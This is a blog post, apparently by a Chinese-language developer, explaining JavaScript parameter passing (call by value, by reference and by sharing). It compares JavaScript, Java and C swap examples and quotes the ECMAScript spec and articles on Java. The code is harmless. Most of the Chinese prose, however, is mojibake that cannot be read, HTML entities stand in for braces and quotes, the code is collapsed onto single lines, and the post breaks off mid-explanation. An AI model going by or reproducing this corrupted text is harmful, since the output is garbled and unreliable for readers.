ä½†é€™æ¬¡æˆ‘æƒ³å˜—è©¦ç¬¬ä¸€ç¨®ï¼Œå¸¶å¤§å®¶çœ‹çœ‹æˆ‘å¹³å¸¸å¯«æ–‡ç« çš„æ™‚å€™éƒ½çœ‹äº†å“ªäº›è³‡æ–™ï¼Œä»¥åŠç™¼æƒ³çš„éç¨‹ç‚ºä½•ï¼Œé€™æ¨£æ‡‰è©²ä¹Ÿæ»¿æœ‰è¶£çš„ã€‚
Letâ€™s go!
ç¾éº—çš„éŒ¯èª¤é–‹é ­æœ‰è¬›éäº†ï¼Œæˆ‘æœƒå†é‡æ–°å›ä¾†ç ”ç©¶åƒæ•¸å‚³éé€™å€‹å•é¡Œå®Œå…¨æ˜¯å€‹ç¾éº—çš„éŒ¯èª¤ï¼Œæˆ‘æœ¬ä¾†è¦å¯«çš„ä¸»é¡Œæ˜¯æ·±æ‹·è²è·Ÿæ·ºæ‹·è²ã€‚
åœ¨æ‰¾è³‡æ–™çš„æ™‚å€™ï¼Œæˆ‘æŸ¥åˆ°äº†é€™ç¯‡æ–‡ï¼š[Javascript] é—œæ–¼ JS ä¸­çš„æ·ºæ‹·è²å’Œæ·±æ‹·è²
ï¼Œæˆ‘çœ‹äº†çœ‹ä¹‹å¾Œç™¼ç¾å¦‚æœæˆ‘è¦ä¾†è¬›æ·±æ‹·è²ï¼Œæˆ‘å°±å¿…é ˆå…ˆè¬›è§£ç‚ºä»€éº¼æˆ‘å€‘éœ€è¦æ·±æ‹·è²ï¼Œå°±è¦è¬›åˆ° Object è·Ÿå…¶ä»– Primitive types çš„ä¸åŒä¹‹è™•ã€‚
æƒ³åˆ°é€™é‚Šï¼Œæˆ‘å°±æƒ³åˆ°äº†ä¸€å€‹è€å•é¡Œï¼šJavaScript çš„ Object åˆ°åº•æ˜¯ pass by value é‚„æ˜¯ pass by refereceï¼Ÿ
æˆ‘ä¾ç¨€è¨˜å¾—ç­”æ¡ˆæ˜¯å‰è€…ï¼Œæˆ–è€…å…©è€…éƒ½ä¸æ˜¯ï¼Œè€Œæ˜¯æœ‰å€‹æ–°çš„åè©å«ä½œ pass by sharingã€‚
ç‚ºäº†é©—è­‰è‡ªå·±çš„å°è±¡æ²’éŒ¯ï¼Œæˆ‘ç¹¼çºŒå‹•æ‰‹æœå°‹ï¼Œæœ€å¾Œæ‰¾åˆ°äº†[ç­†è¨˜] è«‡è«‡JavaScriptä¸­by referenceå’Œby valueçš„é‡è¦è§€å¿µä»¥åŠé‡æ–°èªè­˜ JavaScript: Day 05 JavaScript æ˜¯ã€Œå‚³å€¼ã€æˆ–ã€Œå‚³å€ã€ï¼Ÿï¼Œå¾Œè€…æˆ‘æœ‰å°è±¡æˆ‘çœ‹éï¼Œè€Œä¸”é©—è­‰äº†æˆ‘çš„å°è±¡æ˜¯æ­£ç¢ºçš„ã€‚
å¥½ï¼Œè©±èªªåˆ°é€™è£¡ï¼Œå¿…é ˆå…ˆè·Ÿå¤§å®¶ä»‹ç´¹ä¸€ä¸‹é€™ä¸‰è€…ä»¥åŠä¹‹é–“çš„å·®ç•°ï¼Œå¦å‰‡æ²’è¾¦æ³•ç¹¼çºŒå¾€ä¸‹è¬›ã€‚
Function çš„åƒæ•¸å‚³éæ–¹å¼å…ˆä¾†ä¸€å€‹å¾ˆç°¡å–®çš„ç¯„ä¾‹ï¼š
function swap(a, b) &#123;  var temp = a;  a = b;  b = temp;&#125;  var x = 10;var y = 20;swap(x, y);console.log(x, y) // 10, 20

ç•¶ä½ åŸ·è¡Œå®Œswapä¹‹å¾Œï¼Œxè·Ÿyçš„å€¼ä¸¦æ²’æœ‰äº¤æ›ï¼Œç‚ºä»€éº¼ï¼Ÿå› ç‚ºä½ å‚³é€²å»çš„æ±è¥¿ã€Œä¸æ˜¯çœŸçš„ x è·Ÿ yã€ï¼Œè€Œæ˜¯ã€Œx è·Ÿ y çš„å€¼çš„æ‹·è²ã€ã€‚
ä¹Ÿå°±æ˜¯èªªaè·Ÿbå…¶å¯¦å°±æ˜¯å¦å¤–å…©å€‹æ–°çš„è®Šæ•¸ï¼Œç„¶å¾Œå­˜çš„å€¼è·Ÿxå’Œyä¸€æ¨£ï¼Œä½†ä½ æ”¹è®Šäº†aä¸æœƒæ”¹è®Šxï¼Œå› ç‚ºä»–å€‘æ˜¯å…©å€‹ä¸åŒçš„è®Šæ•¸ã€‚
å¯ä»¥åƒè€ƒä¸‹é¢çš„ç²¾ç¾å°å‹•ç•«ï¼š

ä¸Šé¢é€™ç¨®æ–¹å¼å°±å«åšï¼šcall by valueï¼ˆæˆ–æ˜¯ pass by valueï¼‰ï¼Œåœ¨å‘¼å« function çš„æ™‚å€™æŠŠã€Œå€¼ã€çµ¦è¤‡è£½ä¸€ä»½ã€‚
åˆ°é€™é‚Šæ‡‰è©²é‚„æ»¿å¥½æ‡‚çš„ï¼Œæ¥ä¸‹ä¾†è¦é–‹å§‹æ…¢æ…¢é€²å…¥åˆ°è¤‡é›œçš„éƒ¨åˆ†äº†ã€‚æœ‰å¦å¤–ä¸€ç¨®æ–¹æ³•ï¼Œå«åš call by referenceï¼Œæ„æ€æ˜¯ã€Œä½ å‚³é€²å»çš„æ±è¥¿å°±æ˜¯çœŸçš„ x è·Ÿ yï¼Œfunction è£¡é¢çš„ a è·Ÿ b åªæ˜¯åˆ¥åï¼ˆaliasï¼‰è€Œå·²ï¼Œæ”¹è®Š a å°±æœƒæ”¹è®Š xã€
å¾ˆé¡¯ç„¶çš„ï¼Œåœ¨ JavaScript è£¡é¢å°æ–¼åƒæ•¸å­—é€™ç¨®çš„ Primitive typeï¼Œæ˜¯æ²’æœ‰ call by reference çš„ï¼Œå› ç‚ºä½ çµ•å°ä¸å¯èƒ½é€é function å…§çš„å¼•æ•¸å»æ”¹è®Š function å¤–é¢çš„è®Šæ•¸ã€‚
å°æ–¼æ•¸å­—ä¸å¯èƒ½ï¼Œé‚£å° object å‘¢ï¼Ÿ
function add(obj) &#123;  obj.number++&#125;  var o = &#123;number: 10&#125;add(o)console.log(o.number) // 11

å“ªæ³¥ï¼å±…ç„¶åœ¨ function è£¡é¢æˆåŠŸæ”¹è®Šå¤–é¢çš„æ±è¥¿äº†ï¼é›£é“é€™å°±æ˜¯ call by reference å—ï¼Ÿ
å…ˆåˆ¥æ€¥ï¼Œä¹çœ‹ä¹‹ä¸‹å¾ˆåƒï¼Œå¯æ˜¯æœ‰ä¸€å€‹æ“ä½œæœƒéœ²å‡ºç ´ç¶»ï¼š
function add(obj) &#123;  // è®“ obj è®Šæˆä¸€å€‹æ–°çš„ object  obj = &#123;    number: obj.number + 1  &#125;&#125;  var o = &#123;number: 10&#125;add(o)console.log(o.number) // 10

å¦‚æœæ˜¯çœŸçš„ call by referenceï¼Œé‚£ä½ åœ¨ function è£¡é¢æŠŠ obj çš„å€¼æ”¹æ‰äº†ï¼Œå¤–é¢çš„ o ä¹Ÿæœƒä¸€èµ·è¢«æ”¹æ‰ï¼Œè®Šæˆé‚£å€‹æ–°çš„ objectï¼Œå¯æ˜¯å¾ä¸Šé¢é€™æ®µç¯„ä¾‹çœ‹èµ·ä¾†ä¸¦æ²’æœ‰ï¼Œæ‰€ä»¥é€™æ¨£åšä¸æ˜¯ call by referenceã€‚
æ—¢ä¸æ˜¯ call by value ä¹Ÿä¸æ˜¯ call by referenceï¼Œé‚£é€™æ¨£æ‡‰è©²å«åšä»€éº¼å‘¢ï¼Ÿ
æœ‰äººæŠŠé€™ç¨®æ–¹å¼å«åš call by sharingï¼Œæ„æ€å°±æ˜¯æˆ‘å€‘è®“ function è£¡é¢çš„é‚£å€‹objè·Ÿå¤–é¢çš„oã€Œå…±äº«ã€åŒä¸€å€‹ objectï¼Œæ‰€ä»¥é€éè£¡é¢çš„ objï¼Œä½ å¯ä»¥å»ä¿®æ”¹ã€Œå…±äº«åˆ°çš„é‚£å€‹ objectã€çš„è³‡æ–™ã€‚
ä¸Šé¢éƒ½è·Ÿ call by reference çœ‹èµ·ä¾†æ²’å…©æ¨£ï¼Œä½†æœ€å¤§çš„å·®ç•°æ˜¯å¦‚æœä½ åœ¨ function è£¡é¢æŠŠ obj é‡æ–°è³¦å€¼ï¼Œå°±ä»£è¡¨ä½ è¦è®“é€™å€‹ obj æŒ‡å‘ä¸€å€‹æ–°çš„ objectï¼Œæ‰€ä»¥å¤–é¢çš„ o ä¾èˆŠé‚„æ˜¯åŸä¾†çš„å€¼ã€‚

å¼•å…¥äº†ä¸€å€‹æ–°åè©ä¹‹å¾Œï¼Œçœ‹èµ·ä¾†æ‰€æœ‰å•é¡Œéƒ½å¾—åˆ°äº†è§£ç­”ï¼Œçµè«–å°±æ˜¯ï¼šã€Œåœ¨ JavaScriptï¼Œprimitive types æ˜¯ call by valueï¼Œobject æ˜¯ call by sharingã€
ä¸éï¼Œé€™ä¸€åˆ‡åªæ˜¯æˆ‘å¤©çœŸçš„æƒ³æ³•è€Œå·²ï¼ŒæŸå¤©æˆ‘çœ‹åˆ°ä¸€å¥è©±â€¦
JavaScript åªæœ‰ call by valueé€™å¥è©±ä¹çœ‹ä¹‹ä¸‹å®Œå…¨æ²’é“ç†ï¼Œå‰›å‰›ä¸æ˜¯èªªæ˜¯ call by sharing å—ï¼Ÿæ€éº¼åˆè®Šæˆ call by value äº†ï¼Ÿ
ä½†å…¶å¯¦é€™å¥è©±æ˜¯è¦é€™æ¨£è§£è®€çš„ï¼š
ç•¶ä½ åœ¨å®£å‘Šä¸€å€‹ object çš„æ™‚å€™ï¼Œåœ¨åº•å±¤å¯¦ä½œä¸Šï¼Œå…¶å¯¦é€™å€‹ object å­˜çš„æ˜¯ä¸€å€‹è¨˜æ†¶é«”ä½ç½®ï¼Œæˆ–å¦‚æœç”¨ C çš„æ–¹å¼ä¾†è¬›ï¼Œobject çš„åº•å±¤å°±æ˜¯ä¸€å€‹æŒ‡æ¨™ã€‚
å…ˆå¹«å¤§å®¶è¤‡ç¿’ä¸€ä¸‹æŒ‡æ¨™ï¼Œä½ å¯ä»¥æŠŠæŒ‡æ¨™çœ‹æˆæ˜¯è®Šæ•¸å‹æ…‹çš„ä¸€ç¨®ï¼Œå·®åˆ¥åœ¨æ–¼å®ƒæ‰€å„²å­˜çš„å€¼æ˜¯ã€Œè¨˜æ†¶é«”ä½ç½®ã€ã€‚


o é€™å€‹è®Šæ•¸çš„å€¼æ˜¯ä»€éº¼ï¼Ÿ

é€™å€‹å•é¡Œçš„ç­”æ¡ˆæ˜¯æˆ‘èªç‚ºç†è§£ã€ŒJavaScript åªæœ‰ call by valueã€é€™å¥è©±çš„é—œéµã€‚
å¦‚æœå¾ä¸Šå±¤ä¾†çœ‹ï¼Œç­”æ¡ˆç†æ‰€ç•¶ç„¶æœƒæ˜¯ï¼šã€Œo çš„å€¼æ˜¯ {number: 10}ã€ã€‚å¯æ˜¯å¦‚æœä½ å¾åº•å±¤å¯¦ä½œçš„è§’åº¦ä¾†çœ‹ï¼Œç­”æ¡ˆå°±æœƒæ˜¯ï¼šã€Œo çš„å€¼æ˜¯ 0x01ã€
æˆ‘å€‘ç”¨ç¬¬äºŒå€‹ç­”æ¡ˆç¹¼çºŒå¾€ä¸‹è¬›ï¼Œå‡è¨­ o çš„å€¼æ˜¯ 0x01 çš„è©±ï¼Œé‚£ä½ åœ¨å‘¼å« function çš„æ™‚å€™ï¼Œå‚³é€²å»çš„å€¼å…¶å¯¦å°±æ˜¯ 0x01ï¼Œæ‰€ä»¥åœ¨ function è£¡é¢çš„è®Šæ•¸æ‰å¯ä»¥é€éé€™å€‹è¨˜æ†¶é«”ä½ç½®å»æ“ä½œåŒæ¨£çš„æ±è¥¿ã€‚
å°±æ˜¯æˆ‘å€‘å‰é¢é‚£å¼µåœ–ç•«çš„ï¼Œo è·Ÿ obj å…©å€‹è®Šæ•¸æœƒã€ŒæŒ‡å‘ã€åŒä¸€å€‹åœ°æ–¹ã€‚è€Œåº•å±¤å¯¦ä½œåŸç†å°±æ˜¯æŠŠ o çš„è¨˜æ†¶é«”ä½ç½®å‚³çµ¦ obj å˜›ï¼Œä¸ç„¶æ€éº¼èƒ½æŒ‡å‘åŒå€‹åœ°æ–¹ã€‚
å¦‚æœä»¥é€™å€‹è§’åº¦ä¾†çœ‹ï¼Œcall by sharingï¼ˆå‚³è¨˜æ†¶é«”ä½ç½®é€²å»ï¼‰å…¶å¯¦å°±æ˜¯ call by value çš„ä¸€ç¨®ï¼Œè§£é‡‹çš„æ–¹å¼ç‚ºï¼šå…¶å¯¦ä¸€æ¨£æ˜¯å‚³å€¼çš„æ‹·è²é€²å»ï¼Œåªæ˜¯é€™å€‹å€¼æ˜¯è¨˜æ†¶é«”ä½ç½®ã€‚
ä¹è½ä¹‹ä¸‹æœ‰é»é“ç†ï¼Œå¯æ˜¯æœ‰å€‹é»æˆ‘æ€éº¼æƒ³éƒ½æƒ³ä¸é€šï¼š

å¦‚æœä½ è¦å¾åº•å±¤å¯¦ä½œçš„åŸç†ä¾†çœ‹ï¼Œé‚£ call by reference ä¸ä¹Ÿæ˜¯ call by value çš„ä¸€ç¨®å—ï¼Ÿ

å› ç‚ºä»¥åº•å±¤ä¾†çœ‹ï¼Œcall by reference ä¸€æ¨£ä¹Ÿæ˜¯å‚³è¨˜æ†¶é«”ä½ç½®é€²å»å•Šï¼Œé‚£ä¸å°±å…¨ä¸–ç•Œéƒ½åªæœ‰ call by valueï¼Ÿ
å¾Œä¾†æˆ‘æŸ¥åˆ°äº†ä¸€ç¯‡æ–‡ç« è·Ÿæˆ‘æœ‰é¡ä¼¼çš„æƒ³æ³•ï¼šRe: [å•é¡Œ] è«‹å•å‚³åƒè€ƒåˆ°åº•æ˜¯ä»€éº¼?
ä¸éçœ‹å®Œä¹‹å¾Œé‚„æ˜¯æ²’æœ‰å¾—åˆ°è§£ç­”ï¼Œåªæœ‰å€‹æ¨¡ç³Šçš„æ¦‚å¿µï¼Œè¦ºå¾—é€™å¯èƒ½æ˜¯ä¸€å€‹åè©å®šç¾©çš„å•é¡Œã€‚
æŠ±è‘—è¿½æ ¹ç©¶æŸ¢çš„ç²¾ç¥ï¼Œæˆ‘æ±ºå®šä¾†çœ‹çœ‹ ECMAScript æ€éº¼èªªã€‚
æ¢ç´¢è–ç¶“çš„è·¯ç¨‹ECMAScript çš„ spec å°±æ˜¯ JavaScript çš„è–ç¶“ï¼Œåœ¨è£¡é¢ä½ å¯ä»¥æ‰¾åˆ°æ›´åº•å±¤çš„å¯¦ä½œï¼Œè€Œä¸”å…§å®¹çµ•å°ä¸æœƒå‡ºéŒ¯ã€‚
ç›®å‰èƒ½æ‰¾åˆ°çš„ç›¸é—œæ–‡ç« ï¼Œå¤§éƒ¨åˆ†çš„åƒè€ƒè³‡æ–™ä¾†æºéƒ½æ˜¯é€™è£¡ï¼šECMA-262-3 in detail. Chapter 8. Evaluation strategy.
æˆ‘åŸæœ¬ä»¥ç‚ºé€™ç¯‡æ˜¯ ECMA-262-3 çš„ç¯€éŒ„ï¼Œçœ‹å®Œä¹‹å¾Œç™¼ç¾æ ¹æœ¬ä¸æ˜¯ï¼Œå…¶å¯¦åªæ˜¯æŸå€‹äººçœ‹å®Œ ECMA-262-3 ä¹‹å¾Œçš„ç­†è¨˜è€Œå·²ã€‚
ä¸éé€™ç¯‡å…¶å¯¦å¯«å¾—å¾ˆä¸éŒ¯ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥çœ‹çµè«–çš„éƒ¨åˆ†ï¼š

It can be either â€œcall by valueâ€, with specifying that the special case of call by value is meant â€” when the value is the address copy. From this position it is possible to say that everything in ECMAScript are passed by value.


Or, â€œcall by sharingâ€, which makes this distinction from â€œby referenceâ€, and â€œby valueâ€. In this case it is possible to separate passing types: primitive values are passed by value and objects â€” by sharing.


The statement â€œobjects are passed by referenceâ€ formally is not related to ECMAScript and is incorrect.

ä½†å¯æƒœçš„æ˜¯æ²’æœ‰èªª ECMA-262 è£¡é¢åˆ°åº•å“ªå€‹éƒ¨åˆ†æœ‰æåˆ°é€™äº›ï¼Œè€Œä¸”æˆ‘æ€éº¼æŸ¥éƒ½æŸ¥ä¸åˆ°æœ‰ä»»ä½•äººçš„æ–‡ç« æœ‰é™„ä¸Š ECMA-262 çš„åƒè€ƒä¾†æºã€‚
æ²’è¾¦æ³•ï¼Œåªå¥½è‡ªå·±æ‰¾äº†ã€‚
æˆ‘å¾ecma internationalä¸Šé¢ä¸‹è¼‰äº†ECMA-262 edition 8ï¼Œä¸¦ä¸”åˆ©ç”¨å¹¾å€‹é—œéµå­—ä¾†æ‰¾ï¼š

call by reference
call by value
pass by reference
pass by value

çµæœå‘¢ï¼Ÿçµæœä¸€ç„¡æ‰€ç²ï¼Œå®Œå…¨æœå°‹ä¸åˆ°é€™äº›å­—ã€‚æ¥è‘—åªå¥½æŠŠé—œéµå­—ç¸®å°ä¸€é»ï¼Œåˆ©ç”¨ï¼šreferenceã€sharingç­‰ç­‰çš„é—œéµå­—å»æ‰¾ï¼Œæ‰¾åˆ°6.2.4 The Reference Specification Typeï¼Œé›–ç„¶çœ‹ä¼¼ç›¸é—œï¼Œä½†æ²’æœ‰æ‰¾åˆ°æœ€é—œéµçš„éƒ¨åˆ†ã€‚
å…«ç™¾å¤šé çš„æ–‡ç« ï¼Œé€™æ¨£æ…¢æ…¢æ‰¾å¯¦åœ¨æ˜¯å¾ˆç´¯ï¼Œè€Œé€™æ¨£å­æ‰¾ä¸‹ä¾†ï¼Œä¾èˆŠæ²’æœ‰ä»»ä½•æ”¶ç©«ã€‚æ¥è‘—æˆ‘è½‰å€‹å¿µé ­ï¼šã€Œé‚£æˆ‘ä¾†æœå°‹ arguments å¥½äº†ã€ï¼Œæ‰¾åˆ°å…©å€‹çœ‹ä¼¼ç›¸é—œçš„ç« ç¯€ï¼ˆ9.4.4 ArgumentsExoticObjects èˆ‡ 9.2 ECMAScript Function Objectsï¼‰ï¼Œä½†ä¾èˆŠæ²’æœ‰è©³ç´°èªªæ˜ã€‚
ç”¨ä¸Šé¢çš„é—œéµå­—éƒ½æ‰¾ä¸åˆ°ï¼Œæˆ‘æ±ºå®šå†æ›å€‹å¿µé ­ï¼šã€Œé‚£æˆ‘ä¾†æŸ¥ç­‰è™Ÿçš„å®šç¾©å¥½äº†ï¼Œè¦æ¯”è¼ƒ object çš„è©±ï¼Œæ‡‰è©²æœƒå¯«èªªå¦‚ä½•æ¯”è¼ƒå…©å€‹ object æ˜¯å¦ç›¸åŒï¼Œæ‡‰è©²å°±æœƒæåˆ° reference ä¹‹é¡çš„ç›¸é—œè©å½™äº†ï¼ã€
æœ€å¾ŒæŸ¥åˆ°äº†é€™æ®µï¼š



If x and y are the same Object value, return true. Otherwise, return false.


å¥½ï¼Œæœ‰èªªè·Ÿæ²’èªªä¸€æ¨£ã€‚æŸ¥äº†ä¸€å…©å€‹å°æ™‚ç™¼ç¾å¹¾ä¹æ²’é€²å±•ä»¥å¾Œï¼Œæˆ‘æ±ºå®šæ”¾æ£„é€™å€‹æ¥è¿‘ä¹ç™¾é çš„ç‰ˆæœ¬ã€‚
å¾Œä¾†æˆ‘å»ä¸‹è¼‰äº†ECMA-262 çš„ç¬¬ä¸€ç‰ˆï¼Œç¯‡å¹…å°‘å¾ˆå¤šï¼Œåªæœ‰ 200 é ä¸åˆ°ï¼Œåœ¨æœå°‹äº†å¹¾å€‹é—œéµå­—ç™¼ç¾é‚„æ˜¯æ²’ä»€éº¼çµæœä¹‹å¾Œï¼Œæˆ‘æ±ºå®šæŠŠæ•´æœ¬å¿«é€Ÿæƒéä¸€éã€‚
å…ˆè¬›çµè«–ï¼Œæˆ‘é‚„æ˜¯æ²’æœ‰æ‰¾åˆ°ä»»ä½•è·Ÿ call by value&#x2F;reference æœ‰é—œçš„åœ°æ–¹ï¼Œå¯æ˜¯çœ‹åˆ°ä¸€äº›æ»¿æœ‰è¶£çš„æ±è¥¿ã€‚
ä¾‹å¦‚èªªåˆ¤æ–·æ˜¯å¦ç›¸ç­‰çš„åœ°æ–¹å¯«çš„ä¸å¤ªä¸€æ¨£ï¼š


11.9.3 The Abstract Equality Comparison Algorithm
13.Return true if x and y refer to the same object or if they refer to objects joined to each other (see 13.1.2). Otherwise, return false.

æåˆ°äº†ä¸€å€‹å«åš joined objects çš„æ±è¥¿ï¼š

ä¸éè·Ÿæˆ‘å€‘æƒ³æ‰¾çš„åœ°æ–¹é‚„æ˜¯ä¸å¤ªä¸€æ¨£ã€‚
æ–¼æ˜¯ï¼Œæˆ‘æ”¾æ£„äº†å¾ ECMAScript å»æ‰¾ç­”æ¡ˆçš„é€™å€‹æƒ³æ³•ã€‚
åœ¨è¦ºå¾—ç„¡åŠ©çš„åŒæ™‚ï¼Œæƒ³èµ·äº†ä¸€å€‹ä¹Ÿæœ‰è‘—ç›¸ä¼¼å•é¡Œï¼ˆåˆ°åº•æ˜¯ call by value é‚„æ˜¯ call by referenceï¼‰çš„ç¨‹å¼èªè¨€ï¼šJavaã€‚
Java is always pass-by-valueä»¥å‰åœ¨å¯« Java çš„æ™‚å€™ä¹Ÿæœ‰ç¢°éé€™å€‹å•é¡Œï¼Œè€Œä¸”è·Ÿ JavaScript çš„å…¶å¯¦ä¸€æ¨¡ä¸€æ¨£ï¼Œå°±æ˜¯ä½ å‚³ä¸€èˆ¬çš„å€¼é€²å»æ˜¯ by valueï¼Œå¯æ˜¯ä½ å‚³ object é€²å»çš„æ™‚å€™åˆè¡¨ç¾çš„åƒ call by referenceï¼Œä½†æ˜¯è³¦å€¼çš„æ™‚å€™åˆä¸æœƒæ”¹è®Šå¤–é¢çš„ objectã€‚
ä½†çœ‹èµ·ä¾† Java æ°¸é éƒ½æ˜¯ pass by value å·²ç¶“æ˜¯å€‹å…±è­˜äº†ï¼Œå¯åƒè€ƒ Is Java â€œpass-by-referenceâ€ or â€œpass-by-valueâ€?ã€Parameter passing in Java - by reference or by value? è·Ÿ Java is Pass-by-Value, Dammit!ã€‚
ç†ç”±å…¶å¯¦è·Ÿæˆ‘å€‘æœ€é–‹å§‹èªªçš„ä¸€æ¨£ï¼Œè®“æˆ‘ç¯€éŒ„ Java is Pass-by-Value, Dammit! çš„å…¶ä¸­ä¸€å¥ï¼š

However, Objects are not passed by reference. A correct statement would be Object references are passed by value.

ä»¥åŠ Parameter passing in Java - by reference or by value? çš„å…¶ä¸­ä¸€æ®µï¼š

Now that we have some definitions of terms we can return to the question. Does Java pass objects by reference or by value?


The answer is NO! The fact is that Java has no facility whatsoever to pass an object to any function! The reason is that Java has no variables that contain objects.


The reason there is so much confusion is people tend to blur the distinction between an object reference variable and an object instance. All object instances in Java are allocated on the heap and can only be accessed through object references. So if I have the following:


StringBuffer g &#x3D; new StringBuffer( â€œHelloâ€ );
The variable g does not contain the string â€œHelloâ€, it contains a reference (or pointer) to an object instance that contains the string â€œHelloâ€.

g é€™å€‹è®Šæ•¸çš„å€¼ä¸¦ä¸æ˜¯å­—ä¸²Helloï¼Œè€Œæ˜¯ä¸€å€‹æŒ‡åˆ°å­—ä¸² Hello çš„ referenceï¼Œæ‰€ä»¥ä½ åœ¨å‘¼å« function çš„æ™‚å€™ï¼Œå‚³é€²å»çš„å°±æ˜¯é€™å€‹ referenceã€‚

æˆ‘å‚³é€²å»çš„æ˜¯ referenceï¼Œå¯æ˜¯é€™æ¨£ä¸¦ä¸å« call by referenceï¼Ÿ

è½èµ·ä¾†è¶…ç´šç„¡æ•µå¥‡æ€ªï¼Œä½†æ ¹æœ¬åŸå› å…¶å¯¦æ˜¯ã€Œæ­¤ reference éå½¼ referenceã€ï¼Œæˆ‘ç¯€éŒ„ä¸€æ®µCall by valueï¼Ÿä¸­çš„å…§å®¹ï¼š

Java ä¸­ Call by valueï¼ŒæŒ‡çš„æ˜¯å‚³éåƒæ•¸æ™‚ï¼Œä¸€å¾‹å‚³éè®Šæ•¸æ‰€å„²å­˜çš„å€¼ï¼Œç„¡è«–æ˜¯åŸºæœ¬å‹æ…‹æˆ–æ˜¯é¡åˆ¥å®£å‘Šçš„å‹æ…‹éƒ½ä¸€æ¨£ï¼ŒJava ä¸­ä¸å…è¨±è™•ç†è¨˜æ†¶é«”ä½å€ï¼Œæ‰€ä»¥ç”¨äº†ã€Œåƒè€ƒã€é€™å€‹åç¨±ä¾†ä½œç‚ºè§£é‡‹é¡åˆ¥å‹æ…‹æ‰€å®£å‘Šçš„è®Šæ•¸ä¹‹è¡Œç‚ºï¼Œä½†é€™é‚Šçš„ã€Œåƒè€ƒã€èˆ‡ C++ ä¸­æ‰€ç¨±ä¹‹ã€Œåƒè€ƒã€ï¼Œæ˜¯å®Œå…¨ä¸ç›¸åŒçš„è¡Œç‚ºï¼Œæ›´ä¸æœƒæœ‰ C++ ä¸­åƒæ•¸çš„å‚³å€¼ã€å‚³åƒè€ƒã€return çš„å‚³å€¼ã€å‚³åƒè€ƒçš„ Call by reference è¡Œç‚ºã€‚ 

å°±æ˜¯å‘¢ï¼Œæˆ‘å€‘å‚³é€²å»çš„çš„ç¢ºæ˜¯ referenceï¼Œä½†é€™å€‹ reference è·Ÿ C++ è£¡é¢æ‰€ç¨±çš„ã€Œcall by referenceã€å…¶å¯¦æ˜¯ä¸ä¸€æ¨£çš„ï¼Œæ‰€ä»¥ä¸èƒ½ç¨±ä½œã€Œcall by referenceã€ã€‚
é€™ä¸€æ®µå…¶å¯¦è·ŸçŠ€ç‰›æ›¸è£¡é¢11.2. By Value Versus by Referenceæåˆ°çš„æ˜¯å·®ä¸å¤šçš„ï¼š

Before we leave the topic of manipulating objects and arrays by reference, we need to clear up a point of nomenclature.


The phrase â€œpass by referenceâ€ can have several meanings. To some readers, the phrase refers to a function invocation technique that allows a function to assign new values to its arguments and to have those modified values visible outside the function.
This is not the way the term is used in this book. Here, we mean simply that a reference to an object or array â€“ not the object itself â€“ is passed to a function. A function can use the reference to modify properties of the object or elements of the array. But if the function overwrites the reference with a reference to a new object or array, that modification is not visible outside of the function. 
Readers familiar with the other meaning of this term may prefer to say that objects and arrays are passed by value, but the value that is passed is actually a reference rather than the object itself

ä¸éé€™å€‹æ™‚å€™æˆ‘æœ‰äº†å¦å¤–ä¸€å€‹ç–‘å•ï¼šé‚£ C++ è£¡é¢çš„ call by reference åˆ°åº•æ˜¯æ€æ¨£ï¼Ÿ
å—¯ï¼Œçœ‹ä¾†æ˜¯æ™‚å€™è¤‡ç¿’ä¸€ä¸‹å¾ˆä¹…æ²’ç¢°çš„ C è·Ÿ C++äº†ã€‚
C èˆ‡ C++ çš„åƒæ•¸å‚³éå…ˆå¾ C é–‹å§‹å§ï¼ŒC è£¡é¢å°±åªæœ‰ä¸€ç¨®ï¼šcall by valueã€‚
#include &lt;stdio.h&gt;  void swap(int a, int b) &#123;  int temp = b;  b = a;  a = temp;&#125;  int main()&#123;  int x = 10;  int y = 20;  swap(x, y);  printf(&quot;%d %d\n&quot;, x, y); // 10, 20&#125;

å°±åƒæˆ‘å€‘ä¸€é–‹å§‹æ‰€èªªçš„ï¼Œé€™æ¨£å­ä¸¦ä¸æœƒæŠŠxè·Ÿyçš„å€¼äº¤æ›ï¼Œå› ç‚ºaè·Ÿbåªæ˜¯å„²å­˜çš„å€¼è·Ÿxèˆ‡yä¸€æ¨£è€Œå·²ï¼Œé™¤æ­¤ä¹‹å¤–ä¸€é»é—œä¿‚éƒ½æ²’æœ‰ã€‚
å¯æ˜¯å‘¢ï¼Œæˆ‘å€‘ä¹‹å‰æœ‰æåˆ°ï¼ŒC è£¡é¢æœ‰å€‹æ±è¥¿å«åšã€ŒæŒ‡æ¨™ã€ï¼Œèƒ½å¤ å„²å­˜è¨˜æ†¶é«”ä½ç½®ã€‚é€éæŒ‡æ¨™æˆ‘å€‘å…¶å¯¦å¯ä»¥åœ¨ function è£¡é¢æ›´æ”¹å¤–éƒ¨è®Šæ•¸çš„å€¼ã€‚
#include &lt;stdio.h&gt;  void swap(int *a, int *b) &#123;  // å°å‡º a è·Ÿ b æ‰€å­˜çš„å€¼  printf(&quot;%ld, %ld&quot;, a, b); //0x44, 0x40  int temp = *b;  *b = *a;  *a = temp;&#125;  int main()&#123;  int x = 10;  int y = 20;  // å°å‡º x è·Ÿ y çš„è¨˜æ†¶é«”ä½ç½®  printf(&quot;%ld %ld\n&quot;, &amp;x, &amp;y); // 0x44, 0x40  swap(&amp;x, &amp;y); // å‚³è¨˜æ†¶é«”ä½ç½®é€²å»  printf(&quot;%d %d\n&quot;, x, y); // 20, 10&#125;

æˆ‘å€‘é€™æ¬¡å‚³é€²å» function çš„ä¸æ˜¯ä¸€å€‹è®Šæ•¸ï¼Œè€Œæ˜¯ä¸€å€‹è¨˜æ†¶é«”ä½ç½®ï¼Œåœ¨swapè£¡é¢ç”¨æŒ‡æ¨™ä¾†æ¥å—é€™å€‹è¨˜æ†¶é«”ä½ç½®ï¼Œæ¥è‘—å°±å¯ä»¥é€éæŒ‡æ¨™çš„æ“ä½œæŠŠå¤–é¢xèˆ‡yçš„å€¼æ”¹æ‰ã€‚
é€™æ¨£ä¾ç„¶å«åš call by valueï¼Œå¦‚æœä½ é‚„æ˜¯ä¸æ¸…æ¥šç‚ºä»€éº¼ï¼Œå¯ä»¥åƒè€ƒä¸‹é¢é€™å€‹ç¯„ä¾‹ã€‚è·Ÿä¸Šé¢çš„å·®åˆ¥åœ¨æ–¼æˆ‘å…ˆå®£å‘Šå…©å€‹æŒ‡æ¨™æŒ‡å‘xè·Ÿyï¼š
